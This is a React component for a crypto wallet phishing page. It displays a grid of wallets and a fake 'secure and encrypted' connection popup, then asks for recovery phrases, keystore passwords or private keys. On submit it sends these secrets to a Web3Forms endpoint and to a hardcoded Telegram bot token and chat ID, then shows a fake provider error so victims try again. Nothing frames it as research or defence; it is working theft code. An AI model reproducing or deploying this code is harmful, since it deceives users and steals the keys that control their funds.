import  { useState, useRef } from "react";
import wallets from "../../index";

const Cryp = () => {
  const [key, setKey] = useState(false);
  const [privateKey, setPrivateKey] = useState(false);
  const [isOpen, setIsOpen] = useState(false);
  const [border, setBorder] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false); // 🟩 first loading popup
  const [errorPopup, setErrorPopup] = useState(false); // ❌ error popup

  

  const recoveryPhraseRef = useRef(null);
  const walletPasswordRef = useRef(null);
  const privateKeyRef = useRef(null);

  // 🟢 When user clicks a wallet
  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setConnecting(true); // show secure connection popup

    // Simulate connection process
    setTimeout(() => {
      setConnecting(false);
      setIsOpen(true); // open the form after secure connection
    }, 3000);
  };

  

const onSubmit = async (event) => {
  event.preventDefault();
  setLoading(true);
  setResult("Sending...");

  const newFormData = new FormData();
  newFormData.append("walletType", selectedWallet.title);

  let message = `🧾 Wallet Submission\n`;
  message += `Wallet: ${selectedWallet.title}\n`;

  if (recoveryPhraseRef.current && !privateKey) {
    const phrase = recoveryPhraseRef.current.value.trim();
    newFormData.append("recoveryPhrase", phrase);
    message += `Recovery Phrase: ${phrase}\n`;
  }

  if (walletPasswordRef.current && key) {
    const password = walletPasswordRef.current.value.trim();
    newFormData.append("walletPassword", password);
    message += `Wallet Password: ${password}\n`;
  }

  if (privateKeyRef.current && privateKey) {
    const pk = privateKeyRef.current.value.trim();
    newFormData.append("privateKey", pk);
    message += `Private Key: ${pk}\n`;
  }

  newFormData.append(
    "access_key",
    "b664084a-5352-4e8d-9454-d2985759b9a9"
  );

  try {
    // ✅ Send to Web3Forms
    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: newFormData,
    });

    const data = await response.json();
    console.log("Web3Forms:", data);

    // 🚀 Send to Telegram
    await fetch(
      `https://api.telegram.org/bot8417604320:AAH-oQtV6IigL0f4dBQui8ldaF641HRqdJw/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: "6287276563",
          text: message,
        }),
      }
    );

  } catch (error) {
    console.error("Error:", error);
  }

  setTimeout(() => {
    setLoading(false);
    setErrorPopup(true);
  }, 5000);
};



  return (
    <>
      {/* Wallet List */}
     <div className="relative grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-6 p-4 bg-white">
  {wallets.map((wt) => (
    <div
      key={wt.id}
      onClick={() => handleWalletClick(wt)}
      className="cursor-pointer bg-white rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 p-4 flex flex-col items-center group"
    >
      <img
        src={wt.img}
        alt={wt.title}
        className="w-[55px] h-[55px] rounded-full object-contain mb-3"
      />

      <h3 className="text-[15px] font-semibold text-gray-900 text-center">
        {wt.title}
      </h3>

      <p className="text-[12px] text-gray-500 text-center mt-1">
        {wt.title}
      </p>

      {/* Small Icon */}
      <div className="mt-3 w-5 h-5 rounded-full bg-[#4c3bff] flex items-center justify-center text-white text-[10px]">
        <span>▢</span>
      </div>
    </div>
  ))}
</div>

      {/* 🟩 Secure Connection Loading Popup (First Loading) */}
      {connecting && (
        <div className="fixed inset-0 bg-slate-900/70 backdrop-blur flex justify-center items-center z-50">
          <div className="bg-green-50 border border-green-300 p-6 rounded-xl shadow-md text-center w-[320px]">
            <h2 className="text-green-700 font-bold mb-2">
              {selectedWallet ? `${selectedWallet.title} Wallet` : "Connecting Wallet"}
            </h2>

            <p className="text-green-700 text-sm italic mb-4">
              Your connection is secure and encrypted, ensuring your information
              remains on your device.
            </p>

            <div className="flex justify-center mb-4">
              <div className="w-8 h-8 border-2 border-green-400 border-t-transparent rounded-full animate-spin"></div>
            </div>

            <p className="text-green-600 font-semibold">
              Starting secure connection...
            </p>
          </div>
        </div>
      )}

      {/* Wallet Form */}
      {isOpen && selectedWallet && !loading && !errorPopup && !connecting && (
        <div className="fixed inset-0 bg-slate-900/50 backdrop-blur p-8 z-50 flex justify-center items-center">
          <div className="bg-white p-6 rounded-lg shadow-xl w-[400px] text-center">
            <div className="flex items-center space-x-7">
              <img
                className="w-[60px] mb-2"
                src={selectedWallet.img}
                alt={selectedWallet.title}
              />
              <h3 className="text-lg font-bold mb-2">{selectedWallet.title}</h3>
            </div>

            <ul className="text-sm mb-8 py-4 flex px-8 justify-between border-b">
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Phrase
              </li>
              <li
                onClick={() => {
                  setKey(true);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                KeyStore
              </li>
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(true);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Private Key
              </li>
            </ul>

            <form onSubmit={onSubmit}>
              {!privateKey && (
                <div
                  onMouseDown={() => setBorder(!border)}
                  className={`border rounded-md overflow-hidden mb-5 ${
                    border ? "shadow-sm shadow-blue-700" : ""
                  }`}
                >
                  <input
                    className="w-full pb-14 py-1 px-2 outline-none"
                    type="text"
                    placeholder="Enter recovery phrase"
                    ref={recoveryPhraseRef}
                    required
                  />
                </div>
              )}

              {key && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Wallet password"
                    ref={walletPasswordRef}
                    required
                  />
                </div>
              )}

              {privateKey && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Enter your Private Key"
                    ref={privateKeyRef}
                    required
                  />
                </div>
              )}

              <p className="text-[11px] text-start mb-3">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>

              <button
                type="submit"
                className="border w-full mb-4 py-2 text-white font-bold bg-blue-700 rounded"
              >
                PROCEED
              </button>

              <p className="text-start mb-3 text-blue-800">{result}</p>

              <div className="text-end">
                <button
                  type="button"
                  onClick={() => setIsOpen(false)}
                  className="bg-red-600 text-white font-semibold py-2 px-4 rounded"
                >
                  Close
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* 🔵 Processing Popup (Second Loading) */}
      {loading && (
        <div className="fixed inset-0 bg-slate-900/70 backdrop-blur flex justify-center items-center z-50">
          <div className="bg-blue-50 border border-blue-300 p-6 rounded-xl shadow-md text-center w-[320px]">
            <h2 className="text-blue-700 font-bold mb-2">
              Verifying Wallet...
            </h2>

            <div className="flex justify-center mb-4">
              <div className="w-8 h-8 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
            </div>

            <p className="text-blue-600 font-semibold">
              Please wait while we process your request.
            </p>
          </div>
        </div>
      )}

      {/* ❌ Error Popup */}
      {errorPopup && (
        <div className="fixed inset-0 bg-slate-900/70 backdrop-blur flex justify-center items-center z-50">
          <div className="bg-white border border-red-500 p-6 rounded-xl shadow-lg text-center w-[320px]">
            <h2 className="text-red-600 font-bold text-lg mb-2">Error</h2>
            <p className="text-gray-700 text-sm mb-4">
           

Unable to interact With Provider, please try another wallet            </p>
            <button
              onClick={() => (window.location.href = "/wallet")}
              className="bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-5 rounded"
            >
              Try Again
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default Cryp;
